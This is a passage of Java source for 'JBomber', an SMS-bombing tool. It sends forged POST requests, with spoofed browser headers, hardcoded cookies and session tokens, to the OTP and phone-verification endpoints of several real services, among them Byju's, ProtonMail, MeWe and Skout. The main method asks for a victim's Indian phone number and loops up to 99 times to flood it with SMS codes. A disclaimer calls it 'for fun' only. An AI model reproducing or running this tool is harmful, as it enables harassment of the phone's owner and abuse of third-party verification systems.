					+ "&j_username=mrkjan%40ggail.com&j_name=rihan+lovely&j_dob=25%2F06%2F1995&j_password=dlRS%40123&j_confpassword=asAS%40123&CSRFToken=b6835b70f73f87649f7b37501b6cd584fb921232&targetUrl=&mobileStart=true&numberEdit=false&socialid=&gender=&j_displayname=&language=&source=&lastname=&firstname=";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 24) {
			HttpURLConnection con = (HttpURLConnection) new URL(
					"https://api.fynd.com/auth/auth/login-or-register/otp?platform=000000000000000000000001")
							.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "184");
			con.setRequestProperty("content-type", "application/json;charset=UTF-8");
			con.setRequestProperty("cookie",
					"anonymous_id=9b4452b6133442429cfd89e79fd92d1e; ajs_user_id=null; ajs_group_id=null");
			con.setRequestProperty("origin", "https://www.fynd.com");
			con.setRequestProperty("referer", "https://www.fynd.com/auth/login?platform=000000000000000000000001");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-site");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"mobile\":\"" + phone
					+ "\",\"countryCode\":\"91\",\"g-recaptcha-response\":\"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNTkzMTUwOTAwNjkyfQ.pYjj_Y7j0wS2zmJ3xfYS8V8BgGVxylSMSM092MYqno8\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 25) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://user.vedantu.com/user/preLoginVerification")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "74");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"_gcl_au=1.1.1914947564.1593155052; _fbp=fb.1.1593155053680.230276391; moe_uuid=1cb7fd52-74ce-43d1-b0fe-d4560d20b5bf; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%221cb7fd52-74ce-43d1-b0fe-d4560d20b5bf%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22prompt%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1593155058070");
			con.setRequestProperty("origin", "https://www.vedantu.com");
			con.setRequestProperty("referer", "https://www.vedantu.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-site");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"email\":null,\"phoneCode\":\"+91\",\"phoneNumber\":\"" + phone
					+ "\",\"ver\":\"11.230\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 26) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://students.byjus.com/mobiles/sign_up")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept",
					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("cache-control", "max-age=0");
			con.setRequestProperty("content-length", "2001");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded");
			con.setRequestProperty("cookie",
					" _ga=GA1.2.1172301521.1593155473; _gid=GA1.2.1900288845.1593155473; _fbp=fb.1.1593155475899.1798508762; _olapsession=3db82bbe-211e-4ef3-b01b-c6ede2946359; _olapsessionid=_3db82bbe-211e-4ef3-b01b-c6ede2946359_1593155479642; _infinite-student_session=MG5scUZzMGlEMFJxMWRuZ2ZzRU9mcVQ0OUJpM0hQSC9rSlNYNTBCSDhXOE9MenExbUkybGR5ejNIVktVenhVeHJ3VlE2QXJVODVPZWlmODJKdWhqS2NWYUxKV2pNTEJ1MXRmb2wxZFdhaXEva1pLVTc1L1hVN1lTRWdFMjdqbzZFYVV6aTlZOC92anljdGNPcjEwcjlRPT0tLXdUWnBZU3NtTDZqUW1UQ3lQNnp0ZEE9PQ%3D%3D--db64bf63133753c35f9fc29143539f68e9559098");
			con.setRequestProperty("origin", "https://students.byjus.com");
			con.setRequestProperty("referer",
					"https://students.byjus.com/mobiles/register?code=%2B91&mobile=%2B91-9876567876&mode=&number=9876567876&redirect_uri=https%3A%2F%2Fstudents.byjus.com%2Foauth%2Fauthorize%3Fredirect_uri%3Dhttps%3A%2F%2Flearn.byjus.com%2Fcallback%3Freferrer%3Dmx_Source_of_Lead%3DByjusWeb%26mx_Campaign_Type%3DOrganic%26SourceMedium%3DhomePageNewScrollRegister%26mx_Page_Category%3DbyjusHome%26Website%3Dhttps%3A%2F%2Fbyjus.com%26SourceIPAddress%3D%26SourceReferrerURL%3Dhttps%3A%2F%2Fduckduckgo.com%2F%26mx_ad_Id%3D%26mx_adset_id%3D%26mx_pid%3D%26mx_site_id%3D%26SourceCampaign%3D%26mx_Source_Campaign_Id%3D%26mx_utm_Term%3D%26SourceContent%3D%26utm_campaign%3D%26utm_source%3DByjusWeb%26utm_medium%3DhomePageNewScrollRegister%26client_id%3D1f267a0cb39bfe566e0218659508cb1949be4bdea023351a989a1b80b7d0c460%26response_type%3Dtoken%26scope%3Dprofile%2520manage_doubts%26referrer%3Dmx_Source_of_Lead%3DByjusWeb%26mx_Campaign_Type%3DOrganic%26SourceMedium%3DhomePageNewScrollRegister%26mx_Page_Category%3DbyjusHome%26Website%3Dhttps%3A%2F%2Fbyjus.com%26SourceIPAddress%3D%26SourceReferrerURL%3Dhttps%3A%2F%2Fduckduckgo.com%2F%26mx_ad_Id%3D%26mx_adset_id%3D%26mx_pid%3D%26mx_site_id%3D%26SourceCampaign%3D%26mx_Source_Campaign_Id%3D%26mx_utm_Term%3D%26SourceContent%3D%26utm_campaign%3D%26utm_source%3DByjusWeb%26utm_medium%3DhomePageNewScrollRegister&referrer=mx_Source_of_Lead%3DByjusWeb");
			con.setRequestProperty("sec-fetch-dest", "document");
			con.setRequestProperty("sec-fetch-mode", "navigate");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("sec-fetch-user", "?1");
			con.setRequestProperty("upgrade-insecure-requests", "1");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "utf8=%E2%9C%93&authenticity_token=cnRug1bpC9sndc588Frwxx4NmVn4wJcBycOHFDro3PrvOzKShKQ6C6QR9X4WA%2FHymrPDPZPOBFEtGjFhOyJkIA%3D%3D&code=%2B91&number=9873128265&redirect_uri=https%3A%2F%2Fstudents.byjus.com%2Foauth%2Fauthorize%3Fredirect_uri%3Dhttps%3A%2F%2Flearn.byjus.com%2Fcallback%3Freferrer%3Dmx_Source_of_Lead%3DByjusWeb%26mx_Campaign_Type%3DOrganic%26SourceMedium%3DhomePageNewScrollRegister%26mx_Page_Category%3DbyjusHome%26Website%3Dhttps%3A%2F%2Fbyjus.com%26SourceIPAddress%3D%26SourceReferrerURL%3Dhttps%3A%2F%2Fduckduckgo.com%2F%26mx_ad_Id%3D%26mx_adset_id%3D%26mx_pid%3D%26mx_site_id%3D%26SourceCampaign%3D%26mx_Source_Campaign_Id%3D%26mx_utm_Term%3D%26SourceContent%3D%26utm_campaign%3D%26utm_source%3DByjusWeb%26utm_medium%3DhomePageNewScrollRegister%26client_id%3D1f267a0cb39bfe566e0218659508cb1949be4bdea023351a989a1b80b7d0c460%26response_type%3Dtoken%26scope%3Dprofile%2520manage_doubts%26referrer%3Dmx_Source_of_Lead%3DByjusWeb%26mx_Campaign_Type%3DOrganic%26SourceMedium%3DhomePageNewScrollRegister%26mx_Page_Category%3DbyjusHome%26Website%3Dhttps%3A%2F%2Fbyjus.com%26SourceIPAddress%3D%26SourceReferrerURL%3Dhttps%3A%2F%2Fduckduckgo.com%2F%26mx_ad_Id%3D%26mx_adset_id%3D%26mx_pid%3D%26mx_site_id%3D%26SourceCampaign%3D%26mx_Source_Campaign_Id%3D%26mx_utm_Term%3D%26SourceContent%3D%26utm_campaign%3D%26utm_source%3DByjusWeb%26utm_medium%3DhomePageNewScrollRegister&referrer=mx_Source_of_Lead%3DByjusWeb&mode=&mobile=%2B91-"
					+ phone
					+ "&user%5Bname%5D=rihaan+khaan&user%5Bemail%5D=heron%40ggail.com&grade=15&user%5Buser_location_attributes%5D%5Bfull_address%5D=India&user%5Buser_location_attributes%5D%5Badmin_area%5D=Maharashtra&user%5Buser_location_attributes%5D%5Bsub_admin_area%5D=Wardha&user%5Buser_location_attributes%5D%5Blocality%5D=Wadgaon&user%5Buser_location_attributes%5D%5Bsub_locality%5D=&user%5Buser_location_attributes%5D%5Bpostal_code%5D=274401&user%5Buser_location_attributes%5D%5Bcountry_code%5D=IN&user%5Buser_location_attributes%5D%5Blat_long%5D=20.593684%2C78.96288";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			}
			con.getResponseCode();
		}

		else if (count == 27) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://mail.protonmail.com/api/users/code")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/vnd.protonmail.v1+json");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("connection", "keep-alive");
			con.setRequestProperty("content-length", "76");
			con.setRequestProperty("content-type", "application/json;charset=UTF-8");
			con.setRequestProperty("cookie", "Session-Id=XvWjpcbhHQPGiD@6yhg8sQAAADs; Version=default");
			con.setRequestProperty("Host", "mail.protonmail.com");
			con.setRequestProperty("origin", "https://mail.protonmail.com");
			con.setRequestProperty("referer", "https://mail.protonmail.com/create/new?language=en");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("x-pm-apiversion", "3");
			con.setRequestProperty("x-pm-appversion", "Web_3.16.27");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"Username\":\"lihanzek\",\"Type\":\"sms\",\"Destination\":{\"Phone\":\"+91" + phone
					+ "\"}}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 28) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://mewe.com/api/v2/validation/phone/send")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "41");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("cookie",
					"_pk_ref.1.0297=%5B%22%22%2C%22%22%2C1593157131%2C%22https%3A%2F%2Fduckduckgo.com%2F%22%5D; _pk_id.1.0297=e163f60c5318d508.1593157131.1.1593157131.1593157131.; _pk_ses.1.0297=1; mw-rsid=eyJleHAiOiAxNTkzMTYwNzM0NDEyLCAiaXAiOiAiMjIzLjIyNS4xMTEuMjQyIiwgInVhIjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuMTE2IFNhZmFyaS81MzcuMzYiLCAicyI6ICI0Z2ZGSUlvV2dndjBLRENhcDZsbEdnd09PWVhEWGtUeDI4WV81RWphZ0JvIn0");
			con.setRequestProperty("origin", "https://mewe.com");
			con.setRequestProperty("referer", "https://mewe.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("x-requested-with", "XMLHttpRequest");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"phone\":\"" + phone + "\",\"countryCode\":\"+91\"}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 29) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://www.skout.com/api/1/auth/verify-phone")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, text/plain, */*");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("content-length", "85");
			con.setRequestProperty("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
			con.setRequestProperty("cookie",
					"_ga=GA1.3.274105116.1593157774; _gid=GA1.3.1706345830.1593157774; _pxvid=934b8ba2-b781-11ea-bdf7-0242ac120004; _px3=486fd33adc5c618be3d12346a825ccf14bb701dc819f6c4278eaafb27ab2ef05:sNp5otKTG4PRCWnEqUIn7wogsFbaGUc95imD5AIFVYBMTT5+YWBGZ2sQeuqgMFatr+NgrYEsssRMOMoskoZByg==:1000:TJfHPnsKNDrYbV8VdSh/31lTf5xzOiqumcurGbT51Jo99v8dKoCgOlmRLqMZZX4VYBCypNBuFcUvy1cbCUCvCO2ZvTfTWMgF2YejntOoACNwVHSneYgojbXpd1os/22gJIRQ/Az12CRfBLoWYNfFx+jcmGjweHn4vD8Ve0RsGok=; _gat=1");
			con.setRequestProperty("origin", "https://www.skout.com");
			con.setRequestProperty("referer", "https://www.skout.com/");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "application_code=d46dbe487d5baaa0b176cb55d3bc452c&phone=%2B91" + phone + "&countryCode=IN";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}

		else if (count == 30) {
			HttpURLConnection con = (HttpURLConnection) new URL("https://app.trulymadly.com/api/v2/auth/otp/send")
					.openConnection();
			con.setConnectTimeout(5000);
			con.setRequestMethod("POST");
			con.setRequestProperty("Accept", "application/json, application/json");
			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
			con.setRequestProperty("app_version_code", "2");
			con.setRequestProperty("authorization", "Bearer undefined");
			con.setRequestProperty("content-length", "content-length");
			con.setRequestProperty("content-type", "application/json");
			con.setRequestProperty("origin", "https://web.trulymadly.com");
			con.setRequestProperty("referer", "https://web.trulymadly.com/otp");
			con.setRequestProperty("sec-fetch-dest", "empty");
			con.setRequestProperty("sec-fetch-mode", "cors");
			con.setRequestProperty("sec-fetch-site", "same-origin");
			con.setRequestProperty("source", "web_pwa");
			con.setRequestProperty("token", "undefined");
			con.setRequestProperty("user-agent",
					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
			String jason = "{\"mobile\":\"" + phone + "\",\"country_code\":91}";
			con.setDoOutput(true);
			try (OutputStream os = con.getOutputStream()) {
				os.write(jason.getBytes());
			} catch (Exception e) {
			}
			con.getResponseCode();
		}
	}

	// function to check connection....
	private String checkConnection() {
		try {
			URL url = new URL("http://www.google.com");
			url.openConnection().connect();
			return "Connected";
		} catch (Exception e) {
			return "Connection Failed";
		}
	}
	// Driver Code...........

	public static void main(String[] args) throws MalformedURLException, IOException, InterruptedException {
		Scanner sc = new Scanner(System.in);
		System.out.println();
		System.out.println("                             W E L C O M E   T O                        ");
		System.out.println("***********jj***********************************************************");
		System.out.println("           jj                                                     V 1.0 ");
		System.out.println("           jj  bbbbbb    ooooo  mmm     mmm bbbbbb  eeeee rrrrrr        ");
		System.out.println("           jj  bb   bb  oo   oo mm mm mm mm bb   bb ee    rr   rr       ");
		System.out.println("      jj   jj  bbbbbb   oo   oo mm  mmm  mm bbbbbb  eeeee rrrrrr        ");
		System.out.println("      jj   jj  bb   bb  oo   oo mm       mm bb   bb ee    rr   rr       ");
		System.out.println("      jjjjjj   bbbbbb    ooooo  mm       mm bbbbbb  eeeee rr    rr   ");
		System.out.println("************************************************************************");
		System.out.println("                                                            Dev : @mrkhanboyy");
		System.out.println("                                                                  at:github  ");
		System.out.println("-----------------------------------------------------------------------------");
		System.out.println("                                !!Warning!! ");
		System.out.println("               This Bomber is developed for fun purpose only.");
		System.out.println("               Don't misuse it else you will  be responsible. ");
		System.out.println();
		System.out.println("note    : only indian contacts allowed");
		Thread.sleep(2000);
		System.out.println();
		System.out.print("checking network");
		for (int i = 0; i < 6; i++) {
			Thread.sleep(500);
			System.out.print(".");
		}

		JBomber bomb = new JBomber();

		// checking connection
		System.out.println(bomb.checkConnection());

		System.out.println();
		System.out.println();
		System.out.println("Enter phone number without country code  \" eg : 9867xxxxxx\"");
		System.out.print("                                                ");
		String phone = sc.nextLine();

		int n = 0;
		System.out.println("number of messages : max value 99");
		do {
			n = sc.nextInt();
			if (n > 99 || n < 1) {
				System.out.print("please enter value below 100  :  ");
			}
		} while (n > 99 || n < 1);
		System.out.print("Starting bomber");
		for (int i = 0; i < 6; i++) {
			Thread.sleep(500);
			System.out.print(".");
		}
		int x = 1;

		for (int i = 1;; i++) {
			try {
				bomb.bomber(phone, x);
			} catch (Exception e) {
			}
			if (x == 30) {
				x = 0;
			}
			x++;
			System.out.println("messages send successfully : " + i);
			Thread.sleep(1000);
			if (i == n) {
				break;
			}
		}
		System.out.println("Done......");
	}
}